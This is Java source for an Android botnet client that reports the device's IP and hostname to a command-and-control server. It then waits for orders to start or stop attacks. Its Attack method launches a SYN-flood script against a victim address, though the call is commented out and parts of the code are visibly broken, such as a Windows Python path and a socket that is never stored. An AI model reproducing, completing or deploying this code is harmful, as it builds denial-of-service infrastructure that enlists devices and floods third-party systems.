package botnet.botmasterandroidclient;

import android.util.Log;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.Inet4Address;
import java.net.UnknownHostException;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.net.ssl.SSLSocket;

/**
 * Created by Alcohealism on 12-Apr-16.
 */
public class ChatWithCC implements Serializable {
    private int port; //port epikoinwnias me ton C&C Server
    private String CC_IP; //ip tou C&C Server
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private boolean keepWalking = true;
    private Messages msgs = new Messages();
    private String IP, PCname;
    private Process p1;
    private SSLSocket socket;

    /**
     * @param port
     * @param CC_IP
     * Diavazw tis @params apo ton admin otan thelei na dwsei
     * diaforetiko port k IP apo ta default.
     */
    public ChatWithCC(int port, String CC_IP, SSLSocket socket) {
        this.port = port;
        this.CC_IP = CC_IP;
        this.socket = socket;
    }

    /**
     * @param port
     * otan o admin thelei na dwsei mono diaforetiko port ara
     * i CC_IP tha parei timi "localhost"
     */
    public ChatWithCC(int port, SSLSocket socket) {
        this.port = port;
        CC_IP = "localhost";
        this.socket = socket;
    }

    /**
     * @param CC_IP
     * Otan o admin thelei na dwsei mono diaforeretiki IP ara to port
     * to afinume default.
     */
    public ChatWithCC(String CC_IP, SSLSocket socket) {
        this.CC_IP = CC_IP;
        port = 5555;
    }

    /**
     * Default Constructor gia tis default times tis epikoinwnias mas
     */
    public ChatWithCC(SSLSocket socket){
        CC_IP = "localhost";
        port = 5555;
        this.socket = socket;
    }

    public ChatWithCC(ObjectOutputStream oos, ObjectInputStream ois){
        this.oos = oos;
        this.ois =ois;
    }

    public void StartChating() throws IOException {
        IP = GetHostAddress(); //Diavazw tin IP tou mixanimatos.
        PCname = "Android: "+GetHostName(); //Daivazw to Name tou Mixanimatos.
        Log.d("IP:",IP);
        Log.d("name: ", PCname);
        Chat_Thread.start(); //Ksekinaei to chat me ton C&C.
    }


    /**
        * Methodos gia na stamatisw tin sindesi me ton C&C Server.
     */
    public void Stop_Connection(){
        keepWalking = false; //gia na stamatisei to chat alliws to thread dn ginete interrupt gt dn stamataei i liturgeia tou.
        Chat_Thread.interrupt();
        try {
            if(oos != null) oos.close();
            if(ois != null) ois.close();
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
        }
        try {
            if(socket !=null) socket.close();
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    /**
     * Dimiourgia enos thread pou tha xrisimopoiisw tin class chat
     * prokeimenou na dimiurgisw ena chat metaksi tou Bot kai tou
     * C&C Server.
     */
    Thread Chat_Thread = new Thread(new Runnable(){
        @Override
        public void run() {
            Chat chating = new Chat(oos, ois, "C&C Server");
            Bot_Properties bp = new Bot_Properties(IP, PCname);
            chating.SendMessage(bp);
            while(keepWalking == true) {
                Object readObj = chating.readMessage();
                Log.d("Readobj:", readObj.toString());
                /**
                 * An to Bot stilei aitima na klisei tin sindesi k o Server tou apantisei
                 * me "STOP_CONNECTION_WITH_THE_BOTMASTER" tote kleinw tin sindesi.
                 */
                if (readObj.toString().equalsIgnoreCase(msgs.StopConnection())) {
                    Stop_Connection();
                } else if (readObj.toString().equalsIgnoreCase(msgs.BotSendMeYourInfos())) {
                    //bp = new Bot_Properties(IP, PCname);
                    // chating.SendMessage(bp);
                } else if (readObj instanceof Attack_Properties) {
                    Attack_Properties ap = new Attack_Properties();
                    //Attack(ap.getIP_Victim(), ap.getIP_Victim());
                    Log.d("Attack", "!!!");
                } else if (readObj.toString().equalsIgnoreCase(msgs.StopAttack())) {
                    //StopAttack();
                    Log.d("Retreat", ":(");
                }
            }
        }
    });

    /**
     * Methodos poy kalw meso tis python to SynFlood
     */
    private void Attack(String ip, String Victim_port){
        try {
            p1 = Runtime.getRuntime().exec("C:\\Users\\Tharador\\AppData\\Local\\Programs\\Python\\Python35-32\\python SYNFlood.py" + ip + Victim_port);
            //System.out.println("SynFlood is running !!!");
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    private void StopAttack(){
       // System.out.println("Retreat my Bots!!!!");
        p1.destroy();
    }

    /**
     * Methodos pou kanw return tin local ip tou mixanimatos.
     */
    private String GetHostAddress() throws UnknownHostException {
        return Inet4Address.getLocalHost().getHostAddress();
    }

    /**
     * Methodos pou kanw return to name tou mixanimatos.
     */
    private String GetHostName() throws UnknownHostException{
        return Inet4Address.getLocalHost().getHostName();
    }
}
